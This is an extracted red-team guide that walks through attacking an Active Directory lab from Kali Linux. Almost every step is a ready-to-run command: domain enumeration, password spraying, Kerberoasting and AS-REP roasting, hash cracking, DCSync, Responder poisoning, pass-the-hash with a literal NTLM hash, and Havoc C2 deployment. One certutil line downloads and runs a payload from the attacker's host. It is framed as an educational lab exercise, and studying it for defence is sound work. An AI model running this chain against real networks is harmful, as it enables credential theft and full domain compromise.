@@ -1,0 +1,654 @@
+=== Attacking Active Directory (AD) from Kali Linux.pdf ===
+Total Pages: 28
+============================================================
+
+ 
+ 
+ 
+LinkedIn: https://www.linkedin.com/in/seang-y-phuon-a3652514b 
+ 
+By Seang Y Phuon - CEH [P], OSCP, CRTO and CRTE 
+ 
+▪ 
+@ THECyb0rg Lab – a vulnerability research lab 
+• 
+Founder 
+• 
+Ethical Hacker 
+• 
+Zer0-Day Hunter 
+▪ 
+Red Team Lead @ Veilron Technologies Pte. Ltd. 
+▪ 
+Red Team Member @ Synack 
+▪ 
+Yogosha Strike Force @ Yogosha 
+▪ 
+Instructor @ Sunrise Institute, @ OneSala E-Learning Platform 
+▪ 
+Formerly Manager, Cyber Risk @ Deloitte 
+[OFFENSIVE OPS]: 
+Attacking Active Directory (AD) Environment 
+from Kali Linux 
+In collaboration with: 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+1 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Introduction 
+Active Directory (AD) is a directory service for Windows domain networks environment created by 
+Microsoft that contains critical information about the users, systems, or objects within the 
+organization. This directory service has become a potential target going after by malicious threat 
+actors during the offensive operations. Due to its criticality, the threat actor will try to find possible 
+ways to gain foothold on one of the domain-joined systems that could be further leveraged the 
+access to enumerate and attack the Active Directory (AD) or domain controller (DC) and eventually, 
+laterally move from one machine to another within the compromised network. 
+Basically, to attack the Active Directory (AD) environment, the malicious attacker would need to 
+obtain initial access to one of the computer systems within the network and in most of the cases 
+it is Windows workstation. The attack of the Active Directory (AD) initiated from the compromised 
+workstation usually be performed using PowerShell terminal and scripts which is known as Living-
+Off-The-Land (LOTL) approach utilizing the pre-installed or exiting tools and libraries within the 
+workstation. 
+To set aside from the attacks using PowerShell within Windows system, the attack techniques 
+outline in this research paper will be heavily relied on open-sourced tools and scripts published by 
+security researchers around the world and to demonstrate the attacks on the Active Directory (AD) 
+environment using Kali Linux system instead of Windows system as we usually see on most of the 
+research materials.  
+ 
+Disclaimers: 
+The demonstration of the attacks within this paper will be conducted within a vulnerable controlled 
+lab environment with minimal security protections enabled which is set up and configured by 
+THECyb0rg Lab and in collaboration with Veilron Technologies Pte. Ltd. 
+Bypassing the security protections is not in the scope of this paper and the demonstration within 
+this document is for educational purposes only. Such information discussed should never be used 
+for any malicious purposes or to attack against any unauthorized systems without prior permission.  
+The techniques and tools used here are to raise awareness to the public to better understand how 
+the attacks work and providing some insights to secure their target environment from the attacks 
+against the listed tools and scripts as per shown within the materials.  
+ 
+ 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+2 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Author 
+Seang Y PHUON (Codename: THECyb0rg) is the founder of THECyb0rg Lab and a Red Team Lead at Veilron 
+Technologies Pte. Ltd, specialized in leading and conducting red teaming operations as well as years of 
+professional experiences in vulnerability assessment and penetration testing (VAPT). Formerly, he was a 
+manager with years of experience in Cyber Risk Consulting at Deloitte (Cambodia) Co., Ltd for various 
+engagements for financial institutions, government sectors and other industries in Cambodia as well as 
+Laos, Vietnam, Malaysia, and Singapore. He’s currently also an instructor at Sunrise Institute of Technology 
+as well as a member of Yogosha Strike Force and Red Team Member at Synack. 
+ 
+Certifications: 
+▪ 
+Certified Red Team Expert (CRTE) 
+▪ 
+Certified Red Team Operator (CRTO) 
+▪ 
+OffSec Certified Professional (OSCP) 
+▪ 
+Certified Ethical Hacker (CEH - Practical) 
+▪ 
+Bachelor of Computer Science and Engineering (CSE), RUPP, Cambodia 
+ 
+Speaker and Panelist: 
+▪ 
+1st Cybersecurity Bootcamp @ Sunrise Institute of Technology 
+▪ 
+Cybersecurity Landscape Asia 2023 
+▪ 
+Cambodia Cybersecurity 2023 
+▪ 
+Cybersecurity Seminar at Cambodia Academy of Digital Technology (CADT) 
+▪ 
+Young Bruiser Podcast 
+▪ 
+Cyber Youth Cambodia Event #16 
+ 
+Contact: 
+▪ 
+LinkedIn: https://www.linkedin.com/in/seang-y-phuon-a3652514b 
+▪ 
+Facebook Public Figure: ភួន ស ៀងអ ៊ី - PHUON Seang Y 
+▪ 
+Phone #: +855 10 783 795 
+ 
+Misc: 
+▪ 
+https://www.facebook.com/thecyb0rglab 
+▪ 
+https://github.com/THECyb0rgLab 
+▪ 
+https://www.youtube.com/@thecyb0rglab471 
+ 
+ 
+ 
+ 
+THECyb0rg Lab – a vulnerability research lab hunting for unknown vulnerabilities (0-Day) in computer software as well as 
+web applications. A lot of my work and research has been published on the Github Repository, Facebook Page and Youtube 
+channel including customized penetration testing tools, presentations, research papers, technical demonstration videos and 
+various forked projects etc. 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+3 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Table of Contents 
+ 
+1. 
+Reconnaissance ................................................................................................................... 4 
+1.1  Know Your #SHELL ................................................................................................................. 4 
+1.2  Identify Potential Targets ........................................................................................................ 4 
+1.3  Unauthenticated Enumeration................................................................................................ 5 
+2. 
+Exploitation .......................................................................................................................... 8 
+2.1  Password Spray Attack ........................................................................................................... 9 
+2.2  Kerberoast Attack ................................................................................................................ 10 
+2.3  AS-REProast Attack .............................................................................................................. 11 
+2.4  Initial Access ....................................................................................................................... 12 
+3. 
+BloodHound and Authenticated Enumeration ...................................................................... 14 
+3.1  Authenticated LDAP Enumeration ......................................................................................... 14 
+3.2  Unleash Your BloodHound ................................................................................................... 15 
+4. 
+Credential Harvest .............................................................................................................. 16 
+4.1  DCSync Attack..................................................................................................................... 17 
+4.2  Malicious Responder ........................................................................................................... 17 
+5. 
+Lateral Movement ............................................................................................................... 20 
+5.1  Pass-The-Hash Attack (PTH) ................................................................................................. 20 
+5.1  PowerShell Remoting ........................................................................................................... 21 
+6. 
+Havoc C2 Framework .......................................................................................................... 23 
+ 
+ 
+ 
+ 
+ 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+4 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+1.  Reconnaissance 
+Identifying the potential target within the environment is a critical part of the operations as the 
+reconnaissance and network mapping process will provide insights about how big the network is 
+or the number of the systems within the environment and then hunt for the vulnerable systems 
+after being identified and evaluated. 
+1.1  Know Your #SHELL 
+Identify your own IP address and network subnet using native Linux commands: 
+# ifconfig; route -n 
+ 
+ 
+1.2  Identify Potential Targets 
+Identify live systems along with their associated IP addresses and hostnames: 
+# nbtscan -r 192.168.1920/24 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+5 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Identify all opened ports on the domain controller system using nmap scan: 
+# nmap -p- --min-rate=10000 -Pn 192.168.192.142 -n 
+ 
+Enumerate additional information about the domain controller and domain information using 
+LDAP script within nmap. 
+# nmap -sV 192.168.192.142 -n -p389,636 –script ldap-search.nse -Pn 
+ 
+1.3  Unauthenticated Enumeration 
+Enumeration is usually conducted after identifying the potential targets within the environment. 
+The enumeration aims to extract information from the targets as much as possible which such 
+gathered information could then be used for further attacks. Without authentication credentials, 
+we obtained various useful information as shown in the following. 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+6 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Enumerate domain users using windapsearch python scripts from ropnop Github repository: 
+# python3 windapsearch.py –dc-ip 192.168.192.142 -U –full | grep sAMAccountName 
+ 
+Further enumerating on the users, observed that the password for new user has been commented 
+within description attribute of the object which is commonly in use by most system administrators. 
+# python3 windapsearch.py –dc-ip 192.168.192.142 -U –full | grep -iE “sAMAccountName | 
+description” 
+Enumerate domain groups using the windapsearch python scripts: 
+# python3 windapsearch.py –dc-ip 192.168.192.142 -G | grep cn 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+7 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Enumerate for service account with Service Principal Name (SPN) registered that could be 
+potentially abused for Kerberoast attack: 
+# python3 windapsearch.py –dc-ip 192.198.192.142 –user-spns 
+ 
+Enumerate the service account (Kerberoast) using impacket library: 
+# ./GetUserSPNs.py -request thecyborg.lab 
+ 
+Enumerate the service account (AS-REProast) using impacket library: 
+# ./GetNPUsers.py -request thecyborg.lab/ -dc-ip 192.168.192.142 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+8 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Enumerate for anonymous/open share and attempt to access to it: 
+# smbclient -L \\\\192.168.192.142 -N 
+# smbclient \\\\192.168.192.142\\Common -N 
+ 
+ 
+2.  Exploitation 
+Exploitation of the identified misconfigurations and vulnerabilities based on the information 
+gathered from the 2 stages above, is the launch of real attack against the potential targets. The 
+attack may involve spraying a possible or common password onto the list of enumerated users or 
+cracking the exposed service accounts using kerberoast or AS-REProast attack techniques. 
+Extract the enumerated domain users to a list that could then be used a userlist: 
+# python3 windapsearch.py –dc-ip 192.168.192.142 -U –full | grep -iE “sAMAccountName” | tee 
+Userlist.txt 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+9 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+2.1  Password Spray Attack 
+Perform password spray attack against the domain user via Kerberos port (88) using kerbrute from 
+ropnop Github repository: 
+# ./kerbrute passwordspray -d thecyborg.lab UserList Password@123 -dc 192.168.192.142  
+ 
+Perform password spray against the domain users via SMB protocol: 
+# crackmapexec smb 192.168.192.142 -u UserList.txt -p ‘Password@123’ 
+ 
+Perform password spray against the domain users via WinRM protocol: 
+# crackmapexec winrm 192.168.192.142 -u UserList.txt -p ‘Password@123’ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+10 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+ 
+2.2  Kerberoast Attack 
+Perform kerberoast attack against the service principal name (SPN) found on the enumeration 
+stage using impacket library: 
+# ./GetUserSPNs.py -request thecyborg.lab/user1:’Password@123’ 
+ 
+Crack the kerberos ticket of the mssql_svc service account using well-known advanced hash 
+cracking tool hashcat: 
+# hashcat -a 0 -m 13100 kerbticket.txt /root/Desktop/AD-Lab/PasswordList.txt --force 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+11 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+ 
+ 
+2.3  AS-REProast Attack 
+Perform AS-REProast attack against a vulnerable user found on the enumeration stage using 
+impacket library: 
+# ./GetNPUsers.py -request thecyborg.lab/ 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+12 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Crack the kerberos ticket of the philis.bill account using John-The-Ripper: 
+# john asrep.txt –wordlist=/root/Desktop/AD-Lab/PasswordList.txt 
+ 
+2.4  Initial Access 
+Gain access to the domain controller via WinRM using the identified credentials from password 
+spray attack stage: 
+# evil-winrm -i 192.168.192.142 -u user1 -p Password@123 -n 
+ 
+Gain access using PsExec module in Metasploit Framework with the identified credentials from 
+password spray attack stage: 
+# msfconsole 
+# msf > use exploit/windows/smb/psexec 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+13 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+# msf > set RHOST 192.168.192.142 
+# msf > set SMBUser user1 
+# msf > set SMBPass Password@123 
+# msf > exploit 
+ 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+14 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+ 
+3.  BloodHound and Authenticated Enumeration 
+After obtaining the valid set of credentials from the password spray and kerberoast attack, the 
+obtained set of credentials could be used to further enumerate on the environment using 
+authenticated session and bloodhound against the Active Directory (AD) environment to visualize 
+the possible attack paths. Further noted that, some of the information enumerated in the phase 
+was not identified within unauthenticated enumeration stage. 
+3.1  Authenticated LDAP Enumeration 
+Enumerate computer objects within the environment using the identified set of credentials: 
+# python3 windapsearch.py -u user1 -p Password@123 -d thecyborg.lab -C 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+15 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Enumerate unconstrained delegation systems within the environment using the identified set of 
+credentials: 
+# python3 windapsearch.py -u user1 -p Password@123 -d thecyborg.lab –unconstrained-
+computer 
+ 
+3.2  Unleash Your BloodHound 
+Extract the domain objects using bloodhound-python from the Kali Linux system using the 
+identified set of credentials: 
+# bloodhound-python -u user1 -p ‘Password@123’ -c All -dc thecyborg-ad.thecyborg.lab -d 
+thecyborg.lb -ns 192.168.192.142 
+# neo4j console 
+# bloodhound 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+16 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+ 
+The extracted result of the domain objects in bloodhound: 
+ 
+4.  Credential Harvest 
+Extracting the domain credentials could be achieved via DCSync attack and malicious responder. 
+Such activity has been used to achieve domain dominance. The extracted set of credentials/hashes 
+could then be used to laterally move around the network and critical hashes of the domain 
+administrator or krbtgt hashes could be used to create silver or golden tickets as well as perform 
+Pass-The-Hash attack etc. 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+17 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+4.1  DCSync Attack 
+Enumerate the Domain Admins group observed that the user1 is the part of the privileged group 
+which could be abused for the DCSync attack against the domain: 
+# python3 ./windapsearch.py -d thecyborg.lab -u user1 -p Password@123 -m ‘Domain Admins’ 
+ 
+The password hashes of the domain users could be extracted from the domain controller using 
+impacket library: 
+# ./secretdump.py thecyborg.lab/user1:’Password@123’@192.168.192.142 
+ 
+Once the administrator hashes have been obtained and could then be used to gain access to the 
+domain controller using administrator account using Pass-The-Hash (PTH) attack. (Refer to #6 – 
+Lateral Movement) 
+4.2  Malicious Responder 
+Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP and 
+other rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security 
+NTLMSSP and Basic HTTP authentication. The Responder is a very powerful tool and could be used 
+to collect password hashes of the vulnerable systems within the network. 
+# responder -I eth0 –wpad -v 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+18 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+ 
+Any users within the network attempting to access to any invalid URLs or shared folders will be 
+responded by the Responder and the password hashes will be requested from the vulnerable 
+systems/users on the network and the password hashes could be cracked using John-The-Ripper 
+or Hashcat. 
+Access to the invalid URL (thecyborglab) via HTTP protocol from a client workstation 
+(192.168.192.138): 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+19 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+The NTLMv2 hashes for user1 was captured by the Responder from the HTTP protocol: 
+ 
+Crack the NTLMv2 password hashes using John-The-Ripper: 
+# john ntlmhashes.txt –wordlist=./PasswordList.txt 
+ 
+Access to the invalid shared folder (\\thecyborglab) via SMB protocol from vulnerable domain 
+controller (192.168.192.142): 
+The NTLMv2 hashes for Administrator was captured by the Responder from the SMB protocol: 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+20 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Crack the NTLMv2 password hashes using John-The-Ripper: 
+# john ntlmhash.txt –wordlist=./PasswordList.txt 
+ 
+5. Lateral Movement 
+Moving laterally from one system to another after obtaining the valid set of credentials or hashes 
+is a common action performed by the malicious threat actor. The local administrator account 
+credentials usually remain the same across the entire domain if Local Administrator Password 
+Solution (LAPS) was not implemented within the environment. Abusing this insecure practice may 
+lead to security compromise of all the workstation within the entire domain. 
+5.1  Pass-The-Hash Attack (PTH) 
+The password hashes of the administrator could be used to perform Pass-The-Hash attack by using 
+the obtained hashes instead of the clear-text password to gain access to the connected systems 
+within the network.  
+Access to a workstation system (192.168.192.139) using the administrator password hashes 
+obtained from the DCSync attack: 
+# ./psexec.py thecyborg.lab/administrator@192.168.192.139 \ 
+-hashes ‘aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b’ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+21 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Access to the domain controller (192.168.192.142) using the administrator password hashes 
+obtained from the DCSync attack: 
+# ./psexec.py thecyborg.lab/administrator@192.168.192.142 \ 
+-hashes ‘aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b’ 
+5.1  PowerShell Remoting 
+From PowerShell access via PsExec on the domain controller (192.168.192.142), initiating remote 
+access is possible to other 2 workstations on the network such as PC1.thecyborg.lab and 
+PC2.thecyborg.lab via PowerShell remoting. 
+Access to PC1.thecyborg.lab via PowerShell remoting: 
+# ./psexec.py thecyborg.lab/administrator@192.168.192.142 \ 
+-hashes ‘aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b’ 
+# powershell 
+# Enter-PSSession -ComputerName PC1.thecyborg.lab 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+22 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+ 
+Access to PC2.thecyborg.lab via PowerShell remoting: 
+# ./psexec.py thecyborg.lab/administrator@192.168.192.142 \ 
+-hashes ‘aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b’ 
+# powershell 
+# Enter-PSSession -ComputerName PC2.thecyborg.lab 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+23 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+6. Havoc C2 Framework 
+Command and Control Server (C2) is the centralized server used to control the compromised 
+systems on the target environment. There are many C2s that have been used by the attackers such 
+as Cobalt Strike, Brute Ratel and more. However, as the scope of the paper relies heavily on the 
+open-sourced tools and frameworks. Therefore, the Havoc C2 is used for the demonstration. 
+Configure C2 profile: 
+# nano /usr/share/havoc/profiles/havoc.yaotl 
+ 
+ 
+Fire up the C2 server: 
+# havoc server –profile /user/share/havoc/profiles/havoc.yaotl 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+24 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Invoke the Havoc client, connect to the server and setup listener: 
+# havoc client 
+# On windows > View > Listener > Add 
+Generate the malicious payload using the configured listener and deploy on the compromised 
+target systems: 
+# On windows > Attack > Payload > Generate 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+25 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Host the generated malicious payload using python server module on port 9090: 
+# python -m http.server 9090 
+ 
+Pass the session from the native command access into C2 command server leveraging the PTH 
+technique: 
+# ./psexec.py thecyborg.lab/administrator@192.168.192.142 \ 
+-hashes ‘aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b’ 
+# certutil.exe -urlcache -f http://192.168.192.128:9090/demon.x64.exe demon.exe 
+# demon.exe 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+26 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+ 
+Replication of the same above technique to gain C2 command access on the compromised systems 
+for both PC1.thecyborg.lab and PC2.thecyborg.lab workstations: 
+ 
+ 
+
+[OFFENSIVE OPS]:  
+Attacking Active Directory (AD) Environment from Kali Linux  
+By: THECyb0rg Lab 
+ 
+ 
+27 |  
+ By: Seang Y Phuon – C|EH [P], OSCP, CRTO, CRTE Certified 
+Appendix 
+Resources and References: 
+https://github.com/WaterExecution/vulnerable-AD-plus 
+https://www.kali.org/get-kali 
+https://github.com/byt3bl33d3r/CrackMapExec 
+https://github.com/fortra/impacket 
+https://hashcat.net/hashcat/ 
+https://github.com/openwall/john 
+https://github.com/HavocFramework/Havoc 
+https://github.com/SpiderLabs/Responder 
+https://github.com/ropnop/windapsearch 
+https://github.com/ropnop/kerbrute 
+https://www.metasploit.com/ 
+https://github.com/dirkjanm/BloodHound.py 
+ 
+Contact: 
+▪ 
+LinkedIn: https://www.linkedin.com/in/seang-y-phuon-a3652514b 
+▪ 
+Facebook Public Figure: ភួន ស ៀងអ ៊ី - PHUON Seang Y 
+▪ 
+Phone #: +855 10 783 795 
+ 
+Misc: 
+▪ 
+https://www.facebook.com/thecyb0rglab 
+▪ 
+https://github.com/THECyb0rgLab 
+▪ 
+https://www.youtube.com/@thecyb0rglab471 
+ 
+ 
+ 
+ 
+ 
+THECyb0rg Lab – a vulnerability research lab hunting for unknown vulnerabilities (0-Day) in computer software as well as 
+web applications. A lot of my work and research has been published on the Github Repository, Facebook Page and Youtube 
+channel including customized penetration testing tools, presentations, research papers, technical demonstration videos and 
+various forked projects etc. 
+In collaboration with: 
